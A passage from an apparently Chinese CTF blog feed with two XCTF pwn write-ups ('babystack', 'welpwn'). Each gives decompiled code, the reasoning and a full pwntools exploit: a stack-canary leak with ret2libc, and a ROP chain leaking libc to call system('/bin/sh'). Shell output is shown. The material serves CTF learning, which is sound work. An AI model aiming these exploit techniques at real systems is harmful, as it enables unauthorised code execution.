class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">256uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// 存在溢出可能</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">sub_400826</span><span class="token punctuation">(</span><span class="token string">"invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">sub_400826</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_400AE7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>用IDA观察后，整个程序没有system  binsh，也没有后门加上出题者给出了libc文件，没得说的这是ret2libc类型。</p><h2 id="3：执行情况"><a href="#3：执行情况" class="headerlink" title="3：执行情况"></a>3：执行情况</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge/pwn100$ ./babystack --------1.store2.print3.quit--------<span class="token operator">>></span> 1AAAAAAAAAAAAAA--------1.store2.print3.quit--------<span class="token operator">>></span> 2AAAAAAAAAAAAAA--------1.store2.print3.quit--------<span class="token operator">>></span> </code></pre><h2 id="4：思路"><a href="#4：思路" class="headerlink" title="4：思路"></a>4：思路</h2><ul><li>程序在读入时存在溢出，但有cookie的存在所以我们得先想办法泄露cookie。</li><li>cookie泄露很简单只要store ‘A’<em>(0x90-0x8) ，即sh.sendline( ‘A’</em>(0x90-0x8))。后面的’\n’将覆盖cookie的末尾\x00，然后print选项即可。</li><li>得到cookie我们再次store来构造payload泄露真实地址，获取libc版本：payload1 = ‘B’<em>(0x90-0x8) + p64(cookie) + ‘B’</em>8 + p64(pop_rdi_ret)   最后面的地址时main函数，我们还需要进行一次攻击</li><li>payload1 += p64(libc_start_main_got) + p64(puts_plt) + p64(0x00000400908)</li><li>用LicbSearcher获取libc版本，地址，从而得到system  binsh地址</li><li>再次store放入system  binsh   payload</li><li>3quit    实现跳转</li></ul><p><strong>要注意这个程序得自己来实现最后的 return 0；也就是3选项</strong></p><h2 id="5：EXP"><a href="#5：EXP" class="headerlink" title="5：EXP"></a>5：EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'babystack'</span><span class="token punctuation">)</span>libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400a93</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040067e</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babystack'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',37000)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##############leaking cookie#################"</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span>cookie <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xa</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##############leaking real addr#################"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x00000400908</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>> '</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>libc_start_main <span class="token operator">=</span>  u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span><span class="token keyword">print</span> type<span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>libc_start_main<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libc_addr==>"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##############fina attack#################"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token operator">*</span><span class="token number">8</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>结果：<span class="token operator">>></span> $ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><p>我在本地测试是完全没问题的但，换成远程就不行了，我觉的是对面的服务器抽风了</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-CHALLENGE-WELPWM</title>
      <link href="/2020/07/19/xctf-challenge-welpwm/"/>
      <url>/2020/07/19/xctf-challenge-welpwm/</url>
      
        <content type="html"><![CDATA[<h2 id="1-checksec"><a href="#1-checksec" class="headerlink" title="1:checksec"></a>1:checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ checksec welpwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/welpwn'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>64位，开启NX防护</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c">main函数：<span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-400h]</span>  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Welcome to RCTF\n"</span><span class="token punctuation">,</span> <span class="token number">16uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x400uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">echo</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment" spellcheck="true">// 传入buf地址</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>这里buf距离RBP距离与read可以读入的大小相同，所以主函数不存在溢出echo函数：<span class="token keyword">int</span> __fastcall <span class="token function">echo</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    #这个<span class="token keyword">for</span>循环可以将buf中的字符逐个复制到数组s2中，截断条件是\x00    s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"ROIS"</span><span class="token punctuation">,</span> s2<span class="token punctuation">)</span> <span class="token punctuation">)</span>      #这个<span class="token keyword">if</span>完全没必要进去，可能是提醒你注意复制过程的截断问题  <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"RCTF{Welcome}"</span><span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">" is not flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>没有system，binsh存在，只有puts，read，write等函数，没有后门。看来我们得想办法泄露libc地址了</p><h2 id="3：思路"><a href="#3：思路" class="headerlink" title="3：思路"></a>3：思路</h2><p>在主函数中buf可以容下0x400个字节，但无法溢出。在echo函数中会对buf无限制复制，到s2数组中，当然只要不出现\x00。所以要在main函数中好好构造payload。<br>在main函数中输入时：’A’<em>16 + ‘A’</em>8 + p64(destination).这就应该能跳转到我们的目的地址。我们要达到的目的是泄露某个函数真正的地址，从而获得libc版本，地址，进而获得system，binsh地址。</p><h3 id="payload位置问题"><a href="#payload位置问题" class="headerlink" title="payload位置问题"></a>payload位置问题</h3><p>这差不多是一个ret2libc问题，所以payload上构造的函数，参数少不了。那么问题是echo函数中只有一个大小为16的数组肯定，我们构造的payload的关键函数无法放在那里。那我们来看看栈的分布情况。</p><pre class=" language-bash"><code class="language-bash">main函数全部的汇编push    rbpmov     rbp, rspsub     rsp, 400hnopnopnopnopnopnopnopnopnopnopmov     edx, 10h        <span class="token punctuation">;</span> nmov     esi, offset aWelcomeToRctf <span class="token punctuation">;</span> <span class="token string">"Welcome to RCTF\n"</span>        <span class="token comment" spellcheck="true">#可以看到除了开始部分，下面的代码并没有改变RBP和RSP</span>mov     edi, 1          <span class="token punctuation">;</span> fdcall    _writemov     rax, cs:__bss_startmov     rdi, rax        <span class="token punctuation">;</span> streamcall    _fflushlea     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     edx, 400h       <span class="token punctuation">;</span> nbytesmov     rsi, rax        <span class="token punctuation">;</span> bufmov     edi, 0          <span class="token punctuation">;</span> fdcall    _readlea     rax, <span class="token punctuation">[</span>rbp+buf<span class="token punctuation">]</span>mov     rdi, raxcall    <span class="token keyword">echo</span>mov     eax, 0leaveretnecho函数前部分汇编var_18<span class="token operator">=</span> qword ptr -18hs2<span class="token operator">=</span> byte ptr -10h<span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span>push    rbpmov     rbp, rspsub     rsp, 20hmov     <span class="token punctuation">[</span>rbp+var_18<span class="token punctuation">]</span>, rdimov     cs:i, 0</code></pre><p>可以看到这两个函数的栈分布应该是很普通的：<br><img src="https://s1.ax1x.com/2020/07/19/UWq0Ag.png" alt=""><br><strong>我们在main函数中构造的payload，会被echo函数复制到它的栈空间，以此我们可以把返回地址覆盖成我们想要的，但只能复制一个地址。因为p64（地址）会出现\x00截断。不过通过这个设计漏洞我们可以控制程序流程。</strong></p><h3 id="流程控制问题"><a href="#流程控制问题" class="headerlink" title="流程控制问题"></a>流程控制问题</h3><p>现在关键在于返回地址我们要覆盖成什么地址。我们知道在buf中前24个字符是padding，被复制给s2数组。下面就是我们覆盖地址。覆盖地址下面还可以构造函数，所以得返回到buf。<br>前面24个padding+一个地址 会占用4个栈帧，我们可以pop掉。<br><img src="https://s1.ax1x.com/2020/07/19/UWqDhj.png" alt=""><br>所以payload = ‘A’*24 + p64(pop_4_ret) + p64(pop_rdi_ret) + p64(got) +p64(puts_ptl) + p64(main)<br>pop 4次后程序就流会被p64(pop_rdi_ret) + p64(got) +p64(puts_ptl) + p64(main)控制，输出某一个函数的正真地址，这是第一次攻击，然后返回到main函数我们可以以类似的方式构造payload来 执行system binsh。<br>这里用puts来输出地址，没用write，因为找不到pop rdx 这个gadget。</p><p>一开始我就是卡在了如何把前面的padding pop掉的问题，没想到直接可以找一个pop4次的地址来跳转。</p><h2 id="4：寻找gadgets"><a href="#4：寻找gadgets" class="headerlink" title="4：寻找gadgets"></a>4：寻找gadgets</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_challenge$ ROPgadget --binary welpwn --only <span class="token string">"pop|ret"</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>0x000000000040089c <span class="token keyword">:</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret        <span class="token comment" spellcheck="true">#选这个保险没有涉及到关键寄存器</span>0x000000000040089e <span class="token keyword">:</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x00000000004008a0 <span class="token keyword">:</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x00000000004008a2 <span class="token keyword">:</span> pop r15 <span class="token punctuation">;</span> ret0x000000000040089b <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r12 <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x000000000040089f <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x0000000000400675 <span class="token keyword">:</span> pop rbp <span class="token punctuation">;</span> ret0x00000000004008a3 <span class="token keyword">:</span> pop rdi <span class="token punctuation">;</span> ret                                   <span class="token comment" spellcheck="true">#这个要用来pop  rdi参数</span>0x00000000004008a1 <span class="token keyword">:</span> pop rsi <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x000000000040089d <span class="token keyword">:</span> pop rsp <span class="token punctuation">;</span> pop r13 <span class="token punctuation">;</span> pop r14 <span class="token punctuation">;</span> pop r15 <span class="token punctuation">;</span> ret0x0000000000400589 <span class="token keyword">:</span> ret0x00000000004006a5 <span class="token keyword">:</span> ret 0xc1480x000000000040081a <span class="token keyword">:</span> ret 0xfffd</code></pre><h2 id="5-EXP"><a href="#5-EXP" class="headerlink" title="5:EXP"></a>5:EXP</h2><p>我写的EXP巨丑</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'welpwn'</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>libc_start_main_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"puts_plt==>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gadgates</span><span class="token comment" spellcheck="true">#0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><span class="token comment" spellcheck="true">#0x00000000004008a3 : pop rdi ; ret</span><span class="token comment" spellcheck="true">#0x0000000000400589 : ret   #遇到system调用的堆栈平衡问题了</span><span class="token comment" spellcheck="true">#sh = process('./welpwn')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">41564</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0040089c</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x04008a3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_start_main_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4005a0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#第一次攻击</span><span class="token comment" spellcheck="true">#payload = p64(0x00000000004008a3)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'AAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>libc_start_main <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token operator">+</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">,</span>libc_start_main<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"libc_addr==>"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0040089c</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x04008a3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#第二次攻击</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0400589</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>结果：<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x41</span> bytes<span class="token punctuation">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token number">00000010</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">9c</span> <span class="token number">08</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  │AAAA│AAAA│··@·│····│    <span class="token number">00000020</span>  a3 <span class="token number">08</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">9a</span> <span class="token number">2e</span> <span class="token number">4e</span> <span class="token number">90</span>  <span class="token number">93</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  │··@·│····│·<span class="token punctuation">.</span>N·│····│    <span class="token number">00000030</span>  <span class="token number">89</span> <span class="token number">05</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">40</span> e4 <span class="token number">37</span> <span class="token number">90</span>  <span class="token number">93</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  │··@·│····│@·<span class="token number">7</span>·│····│    <span class="token number">00000040</span>  <span class="token number">0a</span>                                                  │·│    <span class="token number">00000041</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode$ whoami<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>    <span class="token string">'hunter\n'</span>hunter$  </code></pre><p><strong>这个题，漏洞在其他函数而payload构造在主函数。</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-challenge-Mary_Morton</title>
      <link href="/2020/07/18/xctf-challenge-mary-morton/"/>
      <url>/2020/07/18/xctf-challenge-mary-morton/</url>
      
